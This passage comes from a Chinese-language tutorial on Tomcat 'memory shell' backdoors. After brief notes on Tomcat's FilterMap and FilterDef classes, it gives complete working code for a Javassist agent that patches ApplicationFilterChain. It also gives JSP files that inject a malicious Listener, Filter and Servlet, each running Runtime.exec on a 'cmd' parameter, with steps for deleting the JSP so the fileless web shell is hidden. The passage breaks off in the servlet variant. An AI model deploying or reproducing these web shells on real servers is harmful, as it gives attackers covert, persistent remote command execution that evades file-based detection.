adjustedPattern); &#125; FilterMapWeb 应用程序的filter映射，如部署描述符中&lt;filter-mapping&gt;元素所表示，FilterMap提供了一些方法用来添加filter映射关系。 addURLPattern 添加映射匹配的URL 123public void addURLPattern(String urlPattern) &#123; addURLPatternDecoded(UDecoder.URLDecode(urlPattern, getCharset())); &#125; setFilterName 设置FilterName 123public void setFilterName(String filterName) &#123; this.filterName = filterName;&#125; setDispatcher 此方法将用于设置 FilterMap 的当前状态，表示应应用过滤器的状态 1234567891011121314151617181920212223242526/** * This method will be used to set the current state of the FilterMap * representing the state of when filters should be applied. * @param dispatcherString the dispatcher type which should * match this filter */public void setDispatcher(String dispatcherString) &#123; String dispatcher = dispatcherString.toUpperCase(Locale.ENGLISH); if (dispatcher.equals(DispatcherType.FORWARD.name())) &#123; // apply FORWARD to the global dispatcherMapping. dispatcherMapping |= FORWARD; &#125; else if (dispatcher.equals(DispatcherType.INCLUDE.name())) &#123; // apply INCLUDE to the global dispatcherMapping. dispatcherMapping |= INCLUDE; &#125; else if (dispatcher.equals(DispatcherType.REQUEST.name())) &#123; // apply REQUEST to the global dispatcherMapping. dispatcherMapping |= REQUEST; &#125; else if (dispatcher.equals(DispatcherType.ERROR.name())) &#123; // apply ERROR to the global dispatcherMapping. dispatcherMapping |= ERROR; &#125; else if (dispatcher.equals(DispatcherType.ASYNC.name())) &#123; // apply ERROR to the global dispatcherMapping. dispatcherMapping |= ASYNC; &#125;&#125; FilterDefWeb 应用程序的filter定义，如部署描述符中的 &lt;filter&gt; 元素所示，FilterDef提供了一些方法用来设置filter定义。 setFilter 设置Filter 123456789101112/** * The filter instance associated with this definition */private transient Filter filter = null;public Filter getFilter() &#123; return filter;&#125;public void setFilter(Filter filter) &#123; this.filter = filter;&#125; setFilterName 设置Filter名 1234567891011121314151617/** * The name of this filter, which must be unique among the filters * defined for a particular web application. */private String filterName = null;public String getFilterName() &#123; return (this.filterName);&#125;public void setFilterName(String filterName) &#123; if (filterName == null || filterName.equals(&quot;&quot;)) &#123; throw new IllegalArgumentException( sm.getString(&quot;filterDef.invalidFilterName&quot;, filterName)); &#125; this.filterName = filterName;&#125; setFilterClass 设置Filter类 123456789101112/** * The fully qualified name of the Java class that implements this filter. */private String filterClass = null;public String getFilterClass() &#123; return (this.filterClass);&#125;public void setFilterClass(String filterClass) &#123; this.filterClass = filterClass;&#125; 内存马Agent型内存马在Container请求处理流程源码分析中，我们知道在ApplicationFilterChain类中pos和n是ApplicationFilterChain的成员变量，分别表示过滤器链的当前位置和过滤器总数，当pos小于n时，会不断执行ApplicationFilterChain的internalDoFilter方法因此我们可以用internalDoFilter方法作为内存马入口方法。 1、定义AgentMain，TransformerDemo，在定义一个readSource方法来读取恶意代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package org.example;import javassist.*;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.lang.instrument.Instrumentation;import java.lang.instrument.UnmodifiableClassException;import java.security.ProtectionDomain;public class AgentMain &#123; public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException &#123; System.out.println(&quot;agentmain invoke ! ! !&quot;); Class[] classes = inst.getAllLoadedClasses(); for (Class aClass : classes) &#123; if (aClass.getName().equals(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;)) &#123; inst.addTransformer(new TransformerDemo(), true); inst.retransformClasses(aClass); &#125; &#125; &#125;&#125;class TransformerDemo implements ClassFileTransformer &#123; @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123; try &#123; ClassPool cp = ClassPool.getDefault(); ClassClassPath classPath = new ClassClassPath(classBeingRedefined); cp.insertClassPath(classPath); CtClass ctc = cp.get(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;); CtMethod method = ctc.getDeclaredMethod(&quot;internalDoFilter&quot;); String source = readSource(); method.insertBefore(source); byte[] bytes = ctc.toBytecode(); ctc.detach(); return bytes; &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; return classfileBuffer; &#125; public static String readSource() &#123; StringBuilder source=new StringBuilder(); InputStream is = TransformerDemo.class.getClassLoader().getResourceAsStream(&quot;source.txt&quot;); InputStreamReader isr = new InputStreamReader(is); String line=null; try &#123; BufferedReader br = new BufferedReader(isr); while((line=br.readLine()) != null) &#123; source.append(line); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return source.toString(); &#125;&#125; 2、source.txt 12345678910111213141516171819202122232425262728293031323334 javax.servlet.http.HttpServletRequest request=$1; javax.servlet.http.HttpServletResponse response = $2; String pass=request.getParameter(&quot;pass&quot;); String model=request.getParameter(&quot;model&quot;); String result=&quot;&quot;;try &#123; if (pass!=null&amp;&amp;pass.equals(&quot;self&quot;)) &#123; if (model.equals(&quot;exec&quot;)) &#123; String cmd=request.getParameter(&quot;cmd&quot;); if (cmd != null &amp;&amp; cmd.length() &gt; 0) &#123; Process p = Runtime.getRuntime().exec(cmd); java.io.OutputStream os = p.getOutputStream(); java.io.InputStream in = p.getInputStream(); java.io.DataInputStream dis = new java.io.DataInputStream(in); String disr = dis.readLine(); while (disr != null) &#123; result = result + disr + &quot;\\n&quot;; disr = dis.readLine(); &#125; &#125; &#125; response.getWriter().print(result); return; &#125; &#125; catch(Exception e) &#123; response.getWriter().print(e.getMessage()); &#125; 3、编译成AgentMain.jar，使用解压软件打开jar包，将source.txt复杂到jar包内 4、启动tomcat，然后启动attachmain 5、访问任意路由，带上这些参数pass=self&amp;model=exec&amp;cmd=ipconfig 获取StandardContext对象参考：https://xz.aliyun.com/t/9914 servlet规范型内存马是动态注册符合servlet规范的自定义恶意组件到web容器中，servlet规范型内存马都是基于修改StandardContext实现的。 bitterz师傅将获取StandardContext对象的方法总结在了一起，我这里仅展示实现代码，详情查看https://xz.aliyun.com/t/9914 1、从request对象可以获取servletContext再一步一步获取standardContext。（需要request） 123456789javax.servlet.ServletContext servletContext = request.getServletContext();对象Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;); // 获取属性appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); //从servletContext中获取context属性-&gt;applicationContextField stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;); // 获取属性stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); // 从applicationContext中获取context属性-&gt;standardContext，applicationContext构造时需要传入standardContext 2、从ContextClassLoader获取servletContext（限制在于只可用于Tomcat 8 9） 123org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext(); 3、遍历thread数组获取servletContext（Tomcat全版本） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%class Tomcat6789 &#123; String uri; String serverName; StandardContext standardContext; public Object getField(Object object, String fieldName) &#123; Field declaredField; Class clazz = object.getClass(); while (clazz != Object.class) &#123; try &#123; declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); &#125; catch (NoSuchFieldException e)&#123;&#125; catch (IllegalAccessException e)&#123;&#125; clazz = clazz.getSuperclass(); &#125; return null; &#125; public Tomcat6789() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); Object object; for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if (thread.getName().contains(&quot;exec&quot;)) &#123; continue; &#125; Object target = this.getField(thread, &quot;target&quot;); if (!(target instanceof Runnable)) &#123; continue; &#125; try &#123; object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;); &#125; catch (Exception e) &#123; continue; &#125; if (object == null) &#123; continue; &#125; java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;); Iterator iterator = processors.iterator(); while (iterator.hasNext()) &#123; Object next = iterator.next(); Object req = getField(next, &quot;req&quot;); Object serverPort = getField(req, &quot;serverPort&quot;); if (serverPort.equals(-1))&#123;continue;&#125; org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;); this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;); if (this.serverName == null)&#123; this.serverName = serverNameMB.toString(); &#125; if (this.serverName == null)&#123; this.serverName = serverNameMB.getString(); &#125; org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;); this.uri = (String) getField(uriMB, &quot;strValue&quot;); if (this.uri == null)&#123; this.uri = uriMB.toString(); &#125; if (this.uri == null)&#123; this.uri = uriMB.getString(); &#125; this.getStandardContext(); return; &#125; &#125; &#125; public void getStandardContext() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123; Object target = this.getField(thread, &quot;target&quot;); HashMap children; Object jioEndPoint = null; try &#123; jioEndPoint = getField(target, &quot;this$0&quot;); &#125;catch (Exception e)&#123;&#125; if (jioEndPoint == null)&#123; try&#123; jioEndPoint = getField(target, &quot;endpoint&quot;); &#125;catch (Exception e)&#123; return; &#125; &#125; Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;); StandardEngine engine = null; try &#123; engine = (StandardEngine) getField(service, &quot;container&quot;); &#125;catch (Exception e)&#123;&#125; if (engine == null)&#123; engine = (StandardEngine) getField(service, &quot;engine&quot;); &#125; children = (HashMap) getField(engine, &quot;children&quot;); StandardHost standardHost = (StandardHost) children.get(this.serverName); children = (HashMap) getField(standardHost, &quot;children&quot;); Iterator iterator = children.keySet().iterator(); while (iterator.hasNext())&#123; String contextKey = (String) iterator.next(); if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125; StandardContext standardContext = (StandardContext) children.get(contextKey); this.standardContext = standardContext; return; &#125; &#125; &#125; &#125; public StandardContext getSTC()&#123; return this.standardContext; &#125;&#125;%&gt;&lt;%//获取StandardContext对象Tomcat6789 a = new Tomcat6789();StandardContext standardContext = a.getSTC()%&gt; Listener内存马实现Listener内存马实现非常简单，只需调用addApplicationEventListener方法注入一个listener对象即可 获取StandardContext对象 构造listener对象 将listener添加到初始化的应用程序事件侦听器列表的末尾 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%class Tomcat6789 &#123; String uri; String serverName; StandardContext standardContext; public Object getField(Object object, String fieldName) &#123; Field declaredField; Class clazz = object.getClass(); while (clazz != Object.class) &#123; try &#123; declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); &#125; catch (NoSuchFieldException e)&#123;&#125; catch (IllegalAccessException e)&#123;&#125; clazz = clazz.getSuperclass(); &#125; return null; &#125; public Tomcat6789() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); Object object; for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if (thread.getName().contains(&quot;exec&quot;)) &#123; continue; &#125; Object target = this.getField(thread, &quot;target&quot;); if (!(target instanceof Runnable)) &#123; continue; &#125; try &#123; object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;); &#125; catch (Exception e) &#123; continue; &#125; if (object == null) &#123; continue; &#125; java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;); Iterator iterator = processors.iterator(); while (iterator.hasNext()) &#123; Object next = iterator.next(); Object req = getField(next, &quot;req&quot;); Object serverPort = getField(req, &quot;serverPort&quot;); if (serverPort.equals(-1))&#123;continue;&#125; org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;); this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;); if (this.serverName == null)&#123; this.serverName = serverNameMB.toString(); &#125; if (this.serverName == null)&#123; this.serverName = serverNameMB.getString(); &#125; org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;); this.uri = (String) getField(uriMB, &quot;strValue&quot;); if (this.uri == null)&#123; this.uri = uriMB.toString(); &#125; if (this.uri == null)&#123; this.uri = uriMB.getString(); &#125; this.getStandardContext(); return; &#125; &#125; &#125; public void getStandardContext() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123; Object target = this.getField(thread, &quot;target&quot;); HashMap children; Object jioEndPoint = null; try &#123; jioEndPoint = getField(target, &quot;this$0&quot;); &#125;catch (Exception e)&#123;&#125; if (jioEndPoint == null)&#123; try&#123; jioEndPoint = getField(target, &quot;endpoint&quot;); &#125;catch (Exception e)&#123; return; &#125; &#125; Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;); StandardEngine engine = null; try &#123; engine = (StandardEngine) getField(service, &quot;container&quot;); &#125;catch (Exception e)&#123;&#125; if (engine == null)&#123; engine = (StandardEngine) getField(service, &quot;engine&quot;); &#125; children = (HashMap) getField(engine, &quot;children&quot;); StandardHost standardHost = (StandardHost) children.get(this.serverName); children = (HashMap) getField(standardHost, &quot;children&quot;); Iterator iterator = children.keySet().iterator(); while (iterator.hasNext())&#123; String contextKey = (String) iterator.next(); if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125; StandardContext standardContext = (StandardContext) children.get(contextKey); this.standardContext = standardContext; return; &#125; &#125; &#125; &#125; public StandardContext getSTC()&#123; return this.standardContext; &#125;&#125;%&gt;&lt;% try &#123; //获取StandardContext对象 Tomcat6789 a = new Tomcat6789(); StandardContext standardContext = a.getSTC(); //构造listener对象 ServletRequestListener listener = new ServletRequestListener() &#123; @Override public void requestDestroyed(ServletRequestEvent sre) &#123; HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); String cmd = req.getParameter(&quot;cmd&quot;); if (cmd != null)&#123; try &#123; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; Field requestF = req.getClass().getDeclaredField(&quot;request&quot;); requestF.setAccessible(true); Request request = (Request)requestF.get(req); PrintWriter out= request.getResponse().getWriter(); out.println(output); out.flush(); out.close(); &#125; catch (Exception e) &#123;&#125; &#125; &#125; @Override public void requestInitialized(ServletRequestEvent sre) &#123;&#125; &#125;; //将listener添加到初始化的应用程序事件侦听器列表的末尾 standardContext.addApplicationEventListener(listener); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;%&gt; 访问注入内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令 Filter内存马实现 获取filterConfigs 创建恶意filter 获取FilterDef对象并设置filter、filterName和filterClass 调用addFilterDef为Context添加一个Filter定义 获取FilterMap并设置其URLPattern、FilterName和Dispatcher 添加一个Filter映射到这个Context 获取ApplicationFilterConfig，注入filterDef 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;% class Tomcat6789 &#123; String uri; String serverName; StandardContext standardContext; public Object getField(Object object, String fieldName) &#123; Field declaredField; Class clazz = object.getClass(); while (clazz != Object.class) &#123; try &#123; declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); &#125; catch (NoSuchFieldException e)&#123;&#125; catch (IllegalAccessException e)&#123;&#125; clazz = clazz.getSuperclass(); &#125; return null; &#125; public Tomcat6789() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); Object object; for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if (thread.getName().contains(&quot;exec&quot;)) &#123; continue; &#125; Object target = this.getField(thread, &quot;target&quot;); if (!(target instanceof Runnable)) &#123; continue; &#125; try &#123; object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;); &#125; catch (Exception e) &#123; continue; &#125; if (object == null) &#123; continue; &#125; java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;); Iterator iterator = processors.iterator(); while (iterator.hasNext()) &#123; Object next = iterator.next(); Object req = getField(next, &quot;req&quot;); Object serverPort = getField(req, &quot;serverPort&quot;); if (serverPort.equals(-1))&#123;continue;&#125; org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;); this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;); if (this.serverName == null)&#123; this.serverName = serverNameMB.toString(); &#125; if (this.serverName == null)&#123; this.serverName = serverNameMB.getString(); &#125; org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;); this.uri = (String) getField(uriMB, &quot;strValue&quot;); if (this.uri == null)&#123; this.uri = uriMB.toString(); &#125; if (this.uri == null)&#123; this.uri = uriMB.getString(); &#125; this.getStandardContext(); return; &#125; &#125; &#125; public void getStandardContext() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123; Object target = this.getField(thread, &quot;target&quot;); HashMap children; Object jioEndPoint = null; try &#123; jioEndPoint = getField(target, &quot;this$0&quot;); &#125;catch (Exception e)&#123;&#125; if (jioEndPoint == null)&#123; try&#123; jioEndPoint = getField(target, &quot;endpoint&quot;); &#125;catch (Exception e)&#123; return; &#125; &#125; Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;); StandardEngine engine = null; try &#123; engine = (StandardEngine) getField(service, &quot;container&quot;); &#125;catch (Exception e)&#123;&#125; if (engine == null)&#123; engine = (StandardEngine) getField(service, &quot;engine&quot;); &#125; children = (HashMap) getField(engine, &quot;children&quot;); StandardHost standardHost = (StandardHost) children.get(this.serverName); children = (HashMap) getField(standardHost, &quot;children&quot;); Iterator iterator = children.keySet().iterator(); while (iterator.hasNext())&#123; String contextKey = (String) iterator.next(); if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125; StandardContext standardContext = (StandardContext) children.get(contextKey); this.standardContext = standardContext; return; &#125; &#125; &#125; &#125; public StandardContext getSTC()&#123; return this.standardContext; &#125; &#125;%&gt;&lt;% try &#123; //获取StandardContext对象 Tomcat6789 a = new Tomcat6789(); StandardContext standardContext = a.getSTC(); //// 获取filterConfigs Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); //创建恶意filter String FilterName = &quot;CmdFilter&quot;; Filter filter = new Filter() &#123; @Override public void init(FilterConfig filterConfig) &#123;&#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest req = (HttpServletRequest) servletRequest; if (req.getParameter(&quot;cmd&quot;) != null) &#123; InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream(); Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; servletResponse.getWriter().write(output); PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); &#125; filterChain.doFilter(servletRequest, servletResponse); &#125; @Override public void destroy() &#123;&#125; &#125;; //获取FilterDef对象并设置filter、filterName和filterClass Class&lt;?&gt; FilterDef = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;); Constructor declaredConstructor1 = FilterDef.getDeclaredConstructor(); org.apache.tomcat.util.descriptor.web.FilterDef filterDef = (FilterDef) declaredConstructor1.newInstance(); filterDef.setFilter(filter); filterDef.setFilterName(FilterName); filterDef.setFilterClass(filter.getClass().getName()); // 调用addFilterDef为Context添加一个Filter定义 standardContext.addFilterDef(filterDef); //获取FilterMap并设置其URLPattern、FilterName和Dispatcher Class&lt;?&gt; FilterMap = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;); Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor(); org.apache.tomcat.util.descriptor.web.FilterMap filterMap = (FilterMap) declaredConstructor.newInstance(); filterMap.addURLPattern(&quot;/*&quot;); filterMap.setFilterName(FilterName); filterMap.setDispatcher(DispatcherType.REQUEST.name()); //添加一个Filter映射到这个Context standardContext.addFilterMap(filterMap); //获取ApplicationFilterConfig，注入filterDef Class&lt;?&gt; ApplicationFilterConfig = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;); Constructor&lt;?&gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class); declaredConstructor2.setAccessible(true); org.apache.catalina.core.ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext, filterDef); filterConfigs.put(FilterName, filterConfig); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;%&gt; 访问注入内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令 servlet内存马实现 创建恶意servlet 创建wrapper，设置恶意servlet 添加到children容器中 设置servlet映射 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt; &lt;%class Tomcat6789 &#123; String uri; String serverName; StandardContext standardContext; public Object getField(Object object, String fieldName) &#123; Field declaredField; Class clazz = object.getClass(); while (clazz != Object.class) &#123; try &#123; declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); &#125; catch (NoSuchFieldException e)&#123;&#125; catch (IllegalAccessException e)&#123;&#125; clazz = clazz.getSuperclass(); &#125; return null; &#125; public Tomcat6789() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); Object object; for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if (thread.getName().contains(&quot;exec&quot;)) &#123; continue; &#125; Object target = this.getField(thread, &quot;target&quot;); if (!(target instanceof Runnable)) &#123; continue; &#125; try &#123; object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;); &#125; catch (Exception e) &#123; continue; &#125; if (object == null) &#123; continue; &#125; java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;); Iterator iterator = processors.iterator(); while (iterator.hasNext()) &#123; Object next = iterator.next(); Object req = getField(next, &quot;req&quot;); Object serverPort = getField(req, &quot;serverPort&quot;); if (serverPort.equals(-1))&#123;continue;&#125; org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;); this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;); if (this.serverName == null)&#123; this.serverName = serverNameMB.toString(); &#125; if (this.serverName == null)&#123; this.serverName = serverNameMB.getString(); &#125; org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;); this.uri = (String) getField(uriMB, &quot;strValue&quot;); if (this.uri == null)&#123; this.uri = uriMB.toString(); &#125; if (this.uri == null)&#123; this.uri = uriMB.getString(); &#125; this.getStandardContext(); return; &#125; &#125; &#125; public void getStandardContext() &#123; Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) &#123; if (thread == null) &#123; continue; &#125; if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123; Object target = this.getField(thread, &quot;target&quot;); HashMap children; Object jioEndPoint = null; try &#123; jioEndPoint = getField(target, &quot;this$0&quot;); &#125;catch (Exception e)&#123;&#125; if (jioEndPoint == null)&#123; try&#123; jioEndPoint = getField(target, &quot;endpoint&quot;); 